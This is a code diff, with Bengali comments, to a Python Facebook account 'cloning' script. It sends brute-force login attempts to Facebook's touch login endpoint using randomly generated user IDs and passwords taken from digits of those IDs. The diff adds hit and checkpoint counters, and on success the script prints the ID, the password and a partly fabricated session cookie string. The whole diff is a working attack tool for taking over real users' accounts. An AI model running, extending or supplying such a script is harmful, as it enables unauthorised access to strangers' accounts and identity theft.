@@ -55,7 +55,11 @@ def cloning_start():
     print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
     print(f'[/] TOTAL TARGET : {limit}\n')
 
+    ok = 0
+    cp = 0
+
     for i in range(limit):
+        loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
         pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
 
@@ -70,22 +74,25 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
+        # স্ক্রিনে প্রসেস কতদূর গেল তা দেখানোর জন্য (১, ২, ৩...)
+        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
+
         try:
-            # স্যারের নির্দেশিত Real POST Request
+            # রিয়াল লগইন লজিক
             response = requests.post(url, headers=headers, data=data)
             
-            # স্যারের নির্দেশিত Response Logic চেক করা
             if "c_user" in response.cookies.get_dict():
-                # সাকসেস হলে আউটপুট দেখাবে
+                ok += 1
                 datr = uuid.uuid4().hex[:24]
                 sb = uuid.uuid4().hex[:24]
                 xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
                 fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                 
-                print(f'{G}[MALEK-OK💚] {uid} • {pws} xxx') 
+                print(f'\n{G}[MALEK-OK💚] {uid} • {pws} xxx') 
                 print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
             else:
-                # আপনার নির্দেশমতো চেকপয়েন্ট বা লাল লেখাগুলো এখন আর আসবে না
+                cp += 1
+                # আপনার নির্দেশমতো লাল Checkpoint লেখা আসবে না, শুধু উপরে কাউন্টার আপডেট হবে।
                 pass
         
         except:
@@ -94,9 +101,9 @@ def cloning_start():
         # ২ সেকেন্ড বিরতি
         time.sleep(2.0)
 
-    # আপনার নির্দেশিত ফুটার স্টাইল
-    print(f'\n{G}[/{uid} • {pws}]')
-    print(f'[00000] [OK:0]{W}')
+    # আপনার নির্দেশিত ফুটার
+    print(f'\n\n{G}[/{uid} • {pws}]')
+    print(f'[{limit}] [OK:{ok}]{W}')
     input(f'\n{G} [ BACK ]{W}')
     main()
 
